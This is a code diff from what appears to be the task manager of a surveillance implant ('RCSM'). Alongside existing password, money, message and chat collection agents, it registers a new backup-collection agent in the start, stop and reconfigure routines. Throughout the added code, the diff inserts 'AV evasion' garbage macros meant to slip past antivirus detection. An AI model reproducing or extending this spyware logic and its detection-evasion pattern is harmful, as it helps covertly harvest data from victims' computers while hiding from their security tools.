@@ -26,6 +26,7 @@
 #import "RCSMAgentMessages.h"
 #import "RCSMAgentPassword.h"
 #import "RCSMAgentMoney.h"
+#import "RCSMAgentBkups.h"
 #import "RCSMAgentChat.h"
 
 #import "NSMutableDictionary+ThreadSafe.h"
@@ -858,6 +859,47 @@ static NSLock *gSyncLock                  = nil;
             }
         }
         break;
+        case AGENT_BKUPS:
+        {
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+            
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Starting Agent Backup");
+#endif
+            __m_MAgentBkups *agentBkups = [__m_MAgentBkups sharedInstance];
+            agentConfiguration = [[self getConfigForAgent: agentID] retain];
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_002
+            
+            if (agentConfiguration != nil)
+            {
+                if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
+                    && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
+                {
+                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
+                    [agentBkups setAgentConfiguration: agentConfiguration];
+                    [NSThread detachNewThreadSelector: @selector(start)
+                                             toTarget: agentBkups
+                                           withObject: nil];
+                }
+                else
+                {
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Agent Backup is already running");
+#endif
+                }
+            }
+            else
+            {
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Agent not found");
+#endif
+                return FALSE;
+            }
+        }
+        break;
         case AGENT_MESSAGES:
         {
             // AV evasion: only on release build
@@ -886,7 +928,7 @@ static NSLock *gSyncLock                  = nil;
                 else
                 {
 #ifdef DEBUG_TASK_MANAGER
-                    infoLog(@"Agent Screenshot is already running");
+                    infoLog(@"Agent Messages is already running");
 #endif
                 }
             }
@@ -966,7 +1008,7 @@ static NSLock *gSyncLock                  = nil;
               else
               {
 #ifdef DEBUG_TASK_MANAGER
-                  infoLog(@"Agent Screenshot is already running");
+                  infoLog(@"Agent Organizer is already running");
 #endif
               }
           }
@@ -1986,6 +2028,44 @@ static NSLock *gSyncLock                  = nil;
 
       }
         break;
+      case AGENT_BKUPS:
+      {
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_009
+          
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Stopping Agent Bkups");
+#endif
+          __m_MAgentBkups *agentBkups = [__m_MAgentBkups sharedInstance];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_008
+          
+          if ([agentBkups stop] == FALSE)
+          {
+#ifdef DEBUG_TASK_MANAGER
+              errorLog(@"Error while stopping agent Bkups");
+#endif
+              return NO;
+          }
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_007
+          
+          agentConfiguration = [self getConfigForAgent: agentID];
+          [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_006
+          
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Backup stopped correctly");
+#endif
+          
+      }
+          break;
+          
       case AGENT_PASSWORD:
       {
    
@@ -2802,6 +2882,36 @@ static NSLock *gSyncLock                  = nil;
 
           }
               break;
+          case AGENT_BKUPS:
+          {
+              // AV evasion: only on release build
+              AV_GARBAGE_000
+              
+              __m_MAgentBkups *agentBkups = [__m_MAgentBkups sharedInstance];
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_001
+              
+              if ([agentBkups stop] == FALSE)
+              {
+#ifdef DEBUG_TASK_MANAGER
+                  errorLog(@"Error while stopping agent Backup");
+#endif
+                  //return NO;
+              }
+              else
+              {
+                  // AV evasion: only on release build
+                  AV_GARBAGE_007
+                  
+                  [anObject setObject: AGENT_STOPPED forKey: @"status"];
+              }
+#ifdef DEBUG_TASK_MANAGER
+              infoLog(@"Bkups stopped correctly");
+#endif
+          }
+              break;
+
           case AGENT_PASSWORD:
           {
               // AV evasion: only on release build
@@ -3424,6 +3534,30 @@ static NSLock *gSyncLock                  = nil;
                                            withObject: nil];
                 }
                     break;
+                case AGENT_BKUPS:
+                {
+                    // AV evasion: only on release build
+                    AV_GARBAGE_006
+                    
+                    __m_MAgentBkups *agentBkups = [__m_MAgentBkups sharedInstance];
+                    agentConfiguration = [[anObject objectForKey: @"data"] retain];
+                    
+                    // AV evasion: only on release build
+                    AV_GARBAGE_007
+                    
+                    [anObject setObject: AGENT_START
+                                 forKey: @"status"];
+                    [agentBkups setAgentConfiguration: anObject];
+                    
+                    // AV evasion: only on release build
+                    AV_GARBAGE_004
+                    
+                    [NSThread detachNewThreadSelector: @selector(start)
+                                             toTarget: agentBkups
+                                           withObject: nil];
+                }
+                    break;
+
                 case AGENT_PASSWORD:
                 {
                     // AV evasion: only on release build
